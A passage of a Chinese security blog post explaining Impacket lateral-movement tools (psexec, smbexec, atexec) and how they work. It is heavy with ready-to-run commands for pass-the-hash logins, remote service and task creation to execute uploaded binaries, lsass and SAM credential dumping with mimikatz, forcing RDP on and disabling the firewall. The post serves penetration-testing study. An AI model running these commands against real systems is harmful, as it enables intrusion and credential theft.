@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            Impacket横向移动工具使用及原理
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="TPA HACK-NOTE" type="application/atom+xml">
+</head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">Impacket横向移动工具使用及原理</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-09-09
+                        </span>
+                        
+                            
+                                <span id="/posts/3468438092.html" class="leancloud_visitors" data-flag-title="Impacket横向移动工具使用及原理">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                              
+                        
+                    </p>
+                    
+                        
+                            <span class="category-color">web</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">网络安全</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h1><h2 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h2><p>原项目：python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fortra/impacket</span><br></pre></td></tr></table></figure>
+
+<p>windows&#x2F;linux平台文件运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#Windows&amp;Linux</span><br><span class="line">https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries</span><br><span class="line">#Windows</span><br><span class="line">https://github.com/maaaaz/impacket-examples-windows</span><br></pre></td></tr></table></figure>
+
+<p>GUI图形化项目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#C/S</span><br><span class="line">https://github.com/yutianqaq/impacket-gui</span><br><span class="line">https://github.com/savior-only/Impacket_PyQt5</span><br><span class="line">#B/S Web</span><br><span class="line">https://github.com/XiaoLi996/Impacket_For_Web</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>脚本名</th>
+<th>脚本介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>远程执行</td>
+<td>psexec.py</td>
+<td>使用了RemComSvc的实现了PSEXEC功能的脚本。</td>
+</tr>
+<tr>
+<td>远程执行</td>
+<td>smbexec.py</td>
+<td>类似PSECEX的执行方式，但未使用RemComSvc。这个脚本使用了一个本地SMB Server接收返回的结果，可以避免目标SMB没有可写的目录</td>
+</tr>
+<tr>
+<td>远程执行</td>
+<td>atexec.py</td>
+<td>这个脚本通过MS-TSCH协议控制计划任务在目标机器上执行命令并获得回显</td>
+</tr>
+<tr>
+<td>远程执行</td>
+<td>wmiexec.py</td>
+<td>通过WMI实现了半交互式的Shell，不需要在目标安装任何服务或软件。而且高度隐蔽的以管理员权限运行</td>
+</tr>
+<tr>
+<td>远程执行</td>
+<td>dcomexec.py</td>
+<td>类似wmiexec.py的半交互式Shell，但是使用了DCOM接口，目前支持的接口有<code>MMC20.Application</code>、<code>ShellWindows</code>、<code>ShellBrowserWindows</code></td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>GetTGT.py</td>
+<td>提供密码、hash或aeskey用来请求TGT并且保存为ccache格式</td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>GetST.py</td>
+<td>提供密码、hash、aeskey或ccache格式的TGT，可以请求服务票据并保存为ccache格式。如果提供的账户存在约束委派且支持协议转换，那么可以使用-impersonate选项模拟为其他用户请求票据</td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>GetPac.py</td>
+<td>这个脚本会为指定用户请求经过身份验证的PAC，通过使用MS-SFU协议的S4USelf和U2U的Kerberos认证实现</td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>GetUserSPNs.py</td>
+<td>这个脚本会找出和普通用户账户关联的SPN，输出格式与JtR和hashcat兼容</td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>GetNPUsers.py</td>
+<td>这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。</td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>rbcd.py</td>
+<td>这个脚本可以处理目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性</td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>ticketConverter.py</td>
+<td>这个脚本可以在mimikatz常用的kirbi文件和Impacket常用的ccache文件之间进行转换</td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>ticketer.py</td>
+<td>这个脚本可以基于模板或自己创建金、银票据，并允许你自定义PAC_LOGON_INFO、groups、ExtraSids、duration等属性</td>
+</tr>
+<tr>
+<td>Kerberos协议</td>
+<td>raiseChild.py</td>
+<td>这个脚本通过金票据和ExtraSids实现从子域到域森林的提权</td>
+</tr>
+<tr>
+<td>Windows密码</td>
+<td>secretsdump.py</td>
+<td>提供各种技术以不运行任何程序远程dump密码。对SAM和LSA以及缓存的凭据，会尝试从目标注册表中读取并将hives保存在<code>%SYSTEMROOT%\Temp</code>目录，再将hives读取回来。对于DIT文件，会使用<code>DL_DRSGetNCChanges</code>函数来dump目标的NTLM hash、明文密码和Kerberos keys。也可以通过smbexec或wmiexec执行vssadmin得到NTDS.dit，并对其进行解密。这个脚本在服务不可用的情况下会打开对应的服务，例如远程注册表。在执行结束后，会将激活的服务还原。</td>
+</tr>
+<tr>
+<td>Windows密码</td>
+<td>mimikatz.py</td>
+<td>一个用来控制远程mimikatz RPC服务器的Shell，由@gentikiwi开发。</td>
+</tr>
+</tbody></table>
+<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>psexc最初是由sysinternals提供的windows官方工具，用来管理大量机器</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/">https://learn.microsoft.com/zh-cn/sysinternals/downloads/</a></p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+<p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909190618635.png" alt="image-20240909190618635"></p>
+<h4 id="背景知识（IPC-）"><a href="#背景知识（IPC-）" class="headerlink" title="背景知识（IPC$）"></a>背景知识（IPC$）</h4><ul>
+<li><strong>命名管道</strong>：IPC$ 共享实际上是一个命名管道（Named Pipe），它通过 SMB 协议在网络上提供了一个虚拟的通信通道。这意味着远程客户端可以通过网络连接到这个管道，并通过它发送和接收数据。</li>
+<li><strong>RPC 过程</strong>：通过 IPC$ 共享，客户端可以发起 RPC 调用，从而执行远程系统上的特定服务或功能。SMB 协议在这种情况下提供了传输层的支持，使得 RPC 能够在不同主机之间传递消息。</li>
+</ul>
+<p>利用条件：</p>
+<p>1、开启139、445端口</p>
+<p>2、管理员开启默认共享</p>
+<p>IPC$连接失败原因：</p>
+<p>1、用户名或密码错误</p>
+<p>2、没有打开ipc$默认共享</p>
+<p>3、139、445端口不能成功连接（防火墙）</p>
+<p>IPC$常见连接错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">错误号5:拒绝访问</span><br><span class="line">错误号51: Windows无法找到网络路径,即网络中存在问题。</span><br><span class="line">错误号53:找不到网络路径,包括IP地址错误、目标未开机、目标的 lanmanserver服务未 启动目标有防火</span><br><span class="line">墙(端口过滤)</span><br><span class="line">错误号67:找不到网络名,包括 lanmanworkstation服务未启动、ipcs已被删除</span><br><span class="line">错误号1219:提供的凭据与已存在的凭据集冲突。例如,已经和目标建立了ipcs,需要在删除原连接后重新进</span><br><span class="line">行连接。</span><br><span class="line">错误号1326:未知的用户名或错误的密码</span><br><span class="line">错误号l792;试图登录,但是网络登录服务没有启动,包括目标NetLogon服务未启动（连 接域控制器时会出</span><br><span class="line">现此情况）。</span><br><span class="line">错误号2242:此用户的密码已经过期°例如’目标机器设置了账号管理策略,强制用户定 期修改密码°</span><br></pre></td></tr></table></figure>
+
+
+
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#建立IPC$连接</span><br><span class="line"></span><br><span class="line">net use \\192.168.1.10\ipc$ &quot;密码&quot; /user:administrator</span><br><span class="line"></span><br><span class="line">#查看系统目录</span><br><span class="line">dir \\192.168.1.10\c$</span><br><span class="line"></span><br><span class="line">#查看系统进程</span><br><span class="line">tasklist /s 192.168.1.10</span><br><span class="line"></span><br><span class="line">#查看系统时间</span><br><span class="line">net time \\IP地址</span><br><span class="line"></span><br><span class="line">--计划任务上线-- （先建立IPC$连接）</span><br><span class="line"></span><br><span class="line">#复制文件</span><br><span class="line">copy 文件 \\IP地址\C$</span><br><span class="line"></span><br><span class="line">#创建计划任务</span><br><span class="line">schtasks /create /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f</span><br><span class="line"></span><br><span class="line">#执行计划任务</span><br><span class="line">schtasks /run /s IP地址 /i /tn &quot;计划任务名&quot;</span><br><span class="line"></span><br><span class="line">#删除计划任务</span><br><span class="line">schtasks /delete /s IP地址 /tn &quot;计划任务名&quot; /f</span><br><span class="line"></span><br><span class="line">#清除IPC连接</span><br><span class="line">net use \\IP /del /y</span><br><span class="line"></span><br><span class="line">--系统服务上线-- （先建立IPC$连接）</span><br><span class="line">#复制文件</span><br><span class="line">copy 文件 \\IP地址\C$</span><br><span class="line"></span><br><span class="line">#创建服务</span><br><span class="line">sc \\192.168.1.10 create test binpath= &quot;cmd.exe /c c:\文件&quot;</span><br><span class="line"></span><br><span class="line">#开启服务</span><br><span class="line">sc \\192.168.1.10 start test</span><br><span class="line"></span><br><span class="line">#删除服务</span><br><span class="line">sc \\192.168.1.10 delete test</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>1、SMB开启（139、445端口开启状态）能建立IPC$链接，目标机器开启admin$共享（默认开启）</p>
+<p>2、明文密码&#x2F;NTLM Hash</p>
+<p>3、用户权限</p>
+<p>（1）将文件写入共享文件夹的权限</p>
+<p>（2）能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE</p>
+<p>（3）能够启动所创建的服务：SERVICE_QUERY_STATUS &amp;&amp; SERVICE_START</p>
+<p>总结：IPC$的利用条件+用户权限</p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>原版psexec只支持明文账号密码，Impacket中的psexec支持NTLM Hash登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">原版</span><br><span class="line"></span><br><span class="line">一种先建立IPC通道连接，然后直接使用，操作如下：</span><br><span class="line"></span><br><span class="line"># 先net use 连接上IPC</span><br><span class="line"> net use \\192.168.0.1\ipc$ &quot;password123!@#&quot; /user:alibaba</span><br><span class="line"> </span><br><span class="line"># 确认是否进入IPC会话</span><br><span class="line">.\PsExec64.exe  \\ip  cmd.exe   弹cmd</span><br><span class="line">另一种时在psexec的参数中指定账户密码 操作如下：</span><br><span class="line"></span><br><span class="line">.\PsExec64.exe \\192.168.0.1 –u administrator –p password</span><br><span class="line"></span><br><span class="line">Impacket版</span><br><span class="line"></span><br><span class="line">PsExec.exe -hashes :NTHASH [./]administrator@10.1.2.3 #工作组</span><br><span class="line">PsExec.exe -hashes :NTHASH domain/administrator@10.1.2.3 #域</span><br><span class="line"></span><br><span class="line">交互shell</span><br><span class="line">python3 psexec.py test/administrator:1qaz@WSX@192.168.40.156</span><br><span class="line"></span><br><span class="line">单命令</span><br><span class="line">python3 psexec.py test/administrator:1qaz@WSX@192.168.40.156 whoami</span><br><span class="line"></span><br><span class="line">上传文件并执行</span><br><span class="line">python3 psexec.py test/administrator@192.168.40.156 &quot;/c 1+1&quot;  -remote-binary-name test.exe  -codec 936 -path c:\windows\temp\ -c p.exe -hashes :161cff084477fe596a5db81874498a24</span><br><span class="line"></span><br><span class="line">-port [destination port] 指定目标SMB的端口</span><br><span class="line">-codec codec 目标回显的编码，可先执行chcp.com拿到回显编码</span><br><span class="line">-service-name service_name 指定创建服务的名称，默认随机</span><br><span class="line">-remote-binary-name remote_binary_name 指定上传文件的名称，默认随机</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">psexec \\ip -u administrator -p admin cmd 进⼊半交互式shell</span><br><span class="line">PsExec -accepteula \\192.168.108.101 -s cmd.exe 建立交互的shell</span><br><span class="line">psexec \\ip - uadministrator -p admin -w c:\cmd 进⼊交互式shell，且c:\是⽬标机器的⼯</span><br><span class="line">作⽬录</span><br><span class="line">psexec \\ip -u administrator -p admin whoami all 执行命令</span><br><span class="line">psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行文件</span><br><span class="line">psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执行文件</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>1、建立IPC$连接</p>
+<p>2、通过IPC$连接释放上传psexecsvc.exe</p>
+<p>3、通过服务管理SCManager远程创建psexecsvc服务，并远程启动服务</p>
+<p>4、客户端执行命令连接服务端，服务端启动程序执行并回显数据</p>
+<p>5、运行后删除服务</p>
+<p><code>PSEXESVC</code>服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件（示例中的cmd.exe），同时，它通过主机之间来重定向进程的输入&#x2F;输出（利用命名管道)。</p>
+<p>最终生成4个管道：</p>
+<p><code>服务本身</code>、<code>stdin（输入）</code>、<code>stdout（输出）</code>、<code>stderr（错误输出）</code></p>
+<p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909192719595.png" alt="image-20240909192719595"></p>
+<h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p>首次使用建议 带上-accepteula参数 否则会弹窗</p>
+<h5 id="RDP劫持"><a href="#RDP劫持" class="headerlink" title="RDP劫持"></a>RDP劫持</h5><p>注意：管理员运行CMD</p>
+<p>psexec -s -i cmd<br>quser<br>tscon 2 &#x2F;dest:console</p>
+<p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909221715163.png" alt="image-20240909221715163"></p>
+<h5 id="hash登录"><a href="#hash登录" class="headerlink" title="hash登录"></a>hash登录</h5><p>refer：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8574?time__1311=n4+xnD0DcDuD90DRAYD/ia4BIoD5itetKi1rO4D">https://xz.aliyun.com/t/8574?time__1311=n4%2BxnD0DcDuD90DRAYD%2Fia4BIoD5itetKi1rO4D</a></p>
+<p><strong>准备工作：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#读取lass密码抓取</span><br><span class="line">ProcDump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">Mimikatz# sekurlsa::minidump lsass.dmp</span><br><span class="line">Mimikatz# sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;&gt; password.txt exit</span><br><span class="line"></span><br><span class="line">#读取sam</span><br><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line"></span><br><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">NTML Hash :a2ada404e9515cfb77f9877cf7641855</span><br><span class="line"></span><br><span class="line">#查看RDP是否开启 十六进制0x1关闭，十六进制0x0开启</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br><span class="line"></span><br><span class="line">#强制开启RDP</span><br><span class="line"></span><br><span class="line">修改注册表允许远程桌面连接</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">如果目标开启了防火墙，还需要配置防火墙为允许远程桌面连接。</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">或者直接关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p><strong>登录过程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#查看是否已开启 DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启</span><br><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br><span class="line"></span><br><span class="line">#修改注册表</span><br><span class="line"></span><br><span class="line">位置：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</span><br><span class="line">新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭</span><br><span class="line"></span><br><span class="line">对应命令行开启Restricted Admin mode的命令如下：</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909225605141.png" alt="image-20240909225605141"></p>
+<p>mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061管理员打开CMD</span><br><span class="line"></span><br><span class="line">遇到此错误 ERROR kuhl_m_sekurlsa_acquireLSA ; Modules informations 请检查mimiket及对应操作系统版本</span><br><span class="line"></span><br><span class="line">若遇到 error kuh1_m_sekurlsa_acquireLSA:logon list 请下载最新版mimiketz</span><br><span class="line"></span><br><span class="line">遇到CredSSP加密数据库错误是大概是因为win10家庭版，做演示时俺就遇上了，于是就用2016server虚拟机进行后续操作。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:Administrator /domain:192.168.1.12 /ntlm:a2ada404e9515cfb77f9877cf7641855 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909231156674.png" alt="image-20240909231156674"></p>
+<h4 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h4><p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2961299.html">https://cn-sec.com/archives/2961299.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11877?time__1311=Cq0xuD0DnAit=GNeeeuDYqAKRAxjEow+EbD">https://xz.aliyun.com/t/11877?time__1311=Cq0xuD0DnAit%3DGNeeeuDYqAKRAxjEow%2BEbD</a></p>
+<p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">https://0range-x.github.io/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/332115.html">https://www.freebuf.com/articles/system/332115.html</a></p>
+<h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>与psexec类似</p>
+<p>相同：</p>
+<p>1、139&#x2F;445 SMB协议</p>
+<p>2、建立IPC$连接</p>
+<p>不同：</p>
+<p>1、smbexec不会将二进制文件放入磁盘，smbexec利用一个批处理文件和一个临时文件来执行和转发消息</p>
+<h4 id="使用条件-1"><a href="#使用条件-1" class="headerlink" title="使用条件"></a>使用条件</h4><p>1、139&#x2F;445 SMB端口开启，能建立IPC$链接，目标机器开启admin$共享（默认开启）</p>
+<p>2、权限</p>
+<p>（1）能在远程机器上创建服务</p>
+<p>（2）能够启动所创建的服务</p>
+<h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">## 工作组环境下</span><br><span class="line"># 明文密码</span><br><span class="line">.\smbexec.exe 用户名:密码@ip</span><br><span class="line">.\smbexec.exe admin:admin@192.168.124.165</span><br><span class="line"></span><br><span class="line"># hash</span><br><span class="line">.\smbexec.exe -hashes :NTLMhash 用户名@ip</span><br><span class="line">.\smbexec.exe -hashes :209c6174da490caeb422f3fa5a7ae634 admin@192.168.124.165</span><br><span class="line"></span><br><span class="line"># 在域环境下</span><br><span class="line"># 明文密码</span><br><span class="line">.\smbexec.exe 域名/用户名:密码@ip</span><br><span class="line"></span><br><span class="line"># hash</span><br><span class="line">.\smbexec.exe -hashes :NTLMhash 域名/用户名@ip</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>1、建立IPC$连接</p>
+<p>2、svcctl协议在目标主机创建和启动服务</p>
+<blockquote>
+<p>在使用<code>svcctl</code>时，通常需要通过SMB协议中的IPC共享来与远程系统建立连接。IPC共享来与远程系统建立连接。IPC$（Inter-Process Communication）共享是一个特殊的共享资源，它允许远程系统通过SMB协议进行进程间通信。IPC$共享的存在是为了方便系统之间的通信以及远程管理，但它也可能成为安全风险点，尤其是在默认情况下它通常是开放的，并且不需要显式的用户凭证即可访问。</p>
+<p>通过IPC$共享，<code>svcctl</code>可以：</p>
+<ul>
+<li>枚举远程系统上可用的服务列表。</li>
+<li>启动或停止远程系统上的服务。</li>
+<li>修改服务的配置。</li>
+</ul>
+</blockquote>
+<p>3、将用户需要执行的命令存放在服务中的ImagePath属性中（每执行一次命令就需要创建一次服务）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先会将命令存放进入%TEMP%\execute.bat文件的头部</span><br><span class="line"></span><br><span class="line">运行execute.bat文件并将执行的结果储存至C$共享的__output文件中</span><br><span class="line"></span><br><span class="line">删除execute.bat文件</span><br><span class="line"></span><br><span class="line">客户端通过读取目标C$共享的__output临时文件获取执行结果</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Refer-1"><a href="#Refer-1" class="headerlink" title="Refer"></a>Refer</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/332115.html">深入了解Psexec与SMBexec - FreeBuf网络安全行业门户</a></p>
+<h3 id="atexec"><a href="#atexec" class="headerlink" title="atexec"></a>atexec</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>通过远程调用对方主机的<strong>任务计划程序</strong>（Task Scheduler）创建一个<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?q=%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&zhida_source=entity&is_preview=1">定时任务</a>，然后通过手动触发该定时任务将执行结果写入文本中，再利用smb共享去读取执行结果。</p>
+<blockquote>
